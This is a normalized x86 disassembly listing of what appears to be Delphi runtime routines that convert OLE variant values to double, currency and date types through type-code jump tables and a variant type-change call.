fld [ eax ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax ebx
call sub_4108c4
mov [ esp ] al
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x1
sbb eax eax
inc eax
mov [ esp ] al
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
call sub_410a7c
mov [ esp ] al
jmp r-xdata
setne al
mov [ esp ] al
jmp r-xdata
cmp [ eax ] 0x0
sub_410dd0
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
xor edx edx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_410e85
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0xc ]
call sub_412a44
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
call sub_404140
mov eax [ ebp - 0x1c ]
lea edx [ ebp - 0x18 ]
call sub_4096d4
test al al
je r-xdata
sub edx 0x7ffdfffb
jne r-xdata
mov dx [ ebx ]
mov cx 0x5
mov eax 0x80020005
call sub_40ec60
jmp r-xdata
fld [ ebp - 0x18 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov dx [ ebx ]
mov cx 0x5
call sub_40ec60
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410e8c
lea eax [ ebp - 0x1c ]
call sub_403eb8
lea eax [ ebp - 0xc ]
call sub_4045c4
retn
sub_410e94
push ebx
add esp 0xffffffe8
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
call VariantInit
push 0x5
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x5
call sub_40ec60
mov eax [ esp + 0x10 ]
mov [ esp ] eax
mov eax [ esp + 0x14 ]
mov [ esp + 0x4 ] eax
fld [ esp ]
add esp 0x18
pop ebx
retn
sub_410ee0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_410f35
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x18 ]
call sub_40f32c
lea eax [ ebp - 0x18 ]
call [ rw-data ]
lea eax [ ebp - 0x18 ]
call sub_410f90
fstp [ ebp - 0x8 ]
fwait
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410f3c
lea eax [ ebp - 0x18 ]
call sub_40f004
retn
sub_410f44
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_414518
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x5
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
mov eax [ esp + 0x10 ]
mov [ edi + 0x4 ] eax
sub_410f90
push ebx
add esp 0xffffffec
mov ebx eax
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_410fac ]
mov eax ebx
call sub_410dd0
fstp [ esp ]
fwait
jmp r-xdata
dec dx
je r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
fld [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp ] eax
mov eax [ ebx + 0xc ]
mov [ esp + 0x4 ] eax
jmp r-xdata
fild [ ebx + 0x8 ]
fdiv [ r-xdata ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp ] eax
mov eax [ ebx + 0xc ]
mov [ esp + 0x4 ] eax
jmp r-xdata
mov eax ebx
call sub_410dd0
fstp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
xor eax eax
mov al [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
movzx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_410f90
fstp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_410e94
fstp [ esp ]
fwait
jmp r-xdata
fld [ esp ]
add esp 0x14
pop ebx
retn
mov eax ebx
call sub_410ee0
fstp [ esp ]
fwait
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
mov dx 0x5
mov ax 0x1
call sub_40e7cc
test ah 0x40
je r-xdata
mov edx esp
mov eax ebx
call sub_410f44
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax ebx
call sub_410e94
fstp [ esp ]
fwait
mov eax ebx
call sub_410e94
fstp [ esp ]
fwait
jmp r-xdata
jmp [ eax * 4 + jump_table_411189 ]
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ eax ]
mov [ esp ] edx
mov edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fdiv [ r-xdata ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ eax ]
mov [ esp ] edx
mov edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax ebx
call sub_410dd0
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_410f90
fstp [ esp ]
fwait
jmp r-xdata
sub_411328
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
cmp eax 0x14
ja r-xdata
xor eax eax
push ebp
push sub_41148d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_410f90
fstp [ ebp - 0x8 ]
fwait
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
jmp [ eax * 4 + jump_table_41134a ]
fld [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
fild [ ebp - 0xc ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
fild [ ebp - 0xc ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
fild [ ebp - 0xc ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
fild [ ebp - 0xc ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x14 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
fild [ ebp - 0x14 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov dx 0x4
mov ax 0x1
call sub_40e7cc
sub_4114b8
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor edx edx
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_411594
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0xc ]
call sub_412a44
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
call sub_404140
mov eax [ ebp - 0x1c ]
lea edx [ ebp - 0x8 ]
call sub_40af00
test al al
jne r-xdata
sub edx 0x7ffdfffb
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41159b
lea eax [ ebp - 0x20 ]
mov edx 0x2
call sub_403edc
lea eax [ ebp - 0xc ]
call sub_4045c4
retn
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
call sub_404140
mov eax [ ebp - 0x20 ]
lea edx [ ebp - 0x18 ]
call sub_4096f0
test al al
je r-xdata
mov dx [ ebx ]
mov cx 0x7
call sub_40ec60
jmp r-xdata
mov dx [ ebx ]
mov cx 0x7
mov eax 0x80020005
call sub_40ec60
jmp r-xdata
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
sub_4115a4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
mov [ ebp - 0x18 ] 0x5
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
push 0x7
push 0x0
push 0x400
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x7
call sub_40ec60
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] eax
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_411604
push ebx
add esp 0xffffffe8
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
call VariantInit
push 0x7
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x7
call sub_40ec60
mov eax [ esp + 0x10 ]
mov [ esp ] eax
mov eax [ esp + 0x14 ]
mov [ esp + 0x4 ] eax
fld [ esp ]
add esp 0x18
pop ebx
retn
sub_411650
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_4116a5
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x18 ]
call sub_40f32c
lea eax [ ebp - 0x18 ]
call [ rw-data ]
lea eax [ ebp - 0x18 ]
call sub_411700
fstp [ ebp - 0x8 ]
fwait
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4116ac
lea eax [ ebp - 0x18 ]
call sub_40f004
retn
sub_4116b4
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_414518
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x7
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
mov eax [ esp + 0x10 ]
mov [ edi + 0x4 ] eax
sub_411700
push ebx
add esp 0xffffffec
mov ebx eax
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_41171c ]
mov eax ebx
call sub_4114b8
fstp [ esp ]
fwait
jmp r-xdata
dec dx
je r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_411604
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp ] eax
mov eax [ ebx + 0xc ]
mov [ esp + 0x4 ] eax
jmp r-xdata
mov eax ebx
call sub_4114b8
fstp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
xor eax eax
mov al [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
movzx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax ebx
call sub_4115a4
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_411700
fstp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_411604
fstp [ esp ]
fwait
jmp r-xdata
fld [ esp ]
add esp 0x14
pop ebx
retn
mov eax ebx
call sub_411650
fstp [ esp ]
fwait
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
mov dx 0x7
mov ax 0x1
call sub_40e7cc
test ah 0x40
je r-xdata
mov edx esp
mov eax ebx
call sub_4116b4
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax ebx
call sub_411604
fstp [ esp ]
fwait
mov eax ebx
call sub_411604
fstp [ esp ]
fwait
jmp r-xdata
jmp [ eax * 4 + jump_table_4118e7 ]
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_411604
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ eax ]
mov [ esp ] edx
mov edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax ebx
call sub_4114b8
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax ebx
call sub_4115a4
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_411700
fstp [ esp ]
fwait
jmp r-xdata
sub_411a50
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_411afc
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0xc ]
call sub_412a44
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
call sub_404140
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0x8 ]
call sub_409748
test al al
jne r-xdata
sub edx 0x7ffdfffb
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411b03
lea eax [ ebp - 0x10 ]
call sub_403eb8
lea eax [ ebp - 0xc ]
call sub_4045c4
retn
mov dx [ ebx ]
mov cx 0x6
mov eax 0x80020005
call sub_40ec60
jmp r-xdata
mov dx [ ebx ]
mov cx 0x6
call sub_40ec60
jmp r-xdata
sub_411b0c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
mov [ ebp - 0x18 ] 0x5
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
push 0x6
push 0x0
push 0x400
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x6
call sub_40ec60
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] eax
fild [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_411b6c
push ebx
add esp 0xffffffe8
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
call VariantInit
push 0x6
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x6
call sub_40ec60
mov eax [ esp + 0x10 ]
mov [ esp ] eax
mov eax [ esp + 0x14 ]
mov [ esp + 0x4 ] eax
fild [ esp ]
add esp 0x18
pop ebx
retn
sub_411bb8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_411c0d
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x18 ]
call sub_40f32c
lea eax [ ebp - 0x18 ]
call [ rw-data ]
lea eax [ ebp - 0x18 ]
call sub_411c68
fistp [ ebp - 0x8 ]
fwait
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411c14
lea eax [ ebp - 0x18 ]
call sub_40f004
retn
sub_411c1c
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_414518
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x6
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
mov eax [ esp + 0x10 ]
mov [ edi + 0x4 ] eax
sub_411c68
push ebx
add esp 0xffffffec
mov ebx eax
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_411c84 ]
mov eax ebx
call sub_411a50
fistp [ esp ]
fwait
jmp r-xdata
dec dx
je r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
fild [ ebx + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_411b6c
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp ] eax
mov eax [ ebx + 0xc ]
mov [ esp + 0x4 ] eax
jmp r-xdata
mov eax ebx
call sub_411b6c
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_411a50
fistp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
xor eax eax
mov al [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
movzx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax ebx
call sub_411b0c
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_411c68
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_411b6c
fistp [ esp ]
fwait
jmp r-xdata
fild [ esp ]
add esp 0x14
pop ebx
retn
mov eax ebx
call sub_411bb8
fistp [ esp ]
fwait
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
mov dx 0x6
mov ax 0x1
call sub_40e7cc
test ah 0x40
je r-xdata
mov edx esp
mov eax ebx
call sub_411c1c
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax ebx
call sub_411b6c
fistp [ esp ]
fwait
mov eax ebx
call sub_411b6c
fistp [ esp ]
fwait
jmp r-xdata
jmp [ eax * 4 + jump_table_411e89 ]
mov eax [ ebx + 0x8 ]
fild [ eax ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_411b6c
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ eax ]
mov [ esp ] edx
mov edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax ebx
call sub_411b6c
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_411a50
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax ebx
call sub_411b0c
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_411c68
fistp [ esp ]
fwait
jmp r-xdata
sub_412034
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
call sub_4045c4
push eax
push 0x0
push 0x400
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0x6
call sub_40ec60
pop ebx
pop ebp
retn 0x8
sub_41206c
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
call sub_4045c4
push eax
push 0x0
push 0x400
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0x7
call sub_40ec60
pop ebx
pop ebp
retn 0x8
sub_4120a4
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_41215a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4045c4
push eax
push 0x0
push 0x400
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0xb
call sub_40ec60
mov al [ rw-data ]
sub al 0x1
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412161
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403edc
retn
je r-xdata
lea eax [ ebp - 0x8 ]
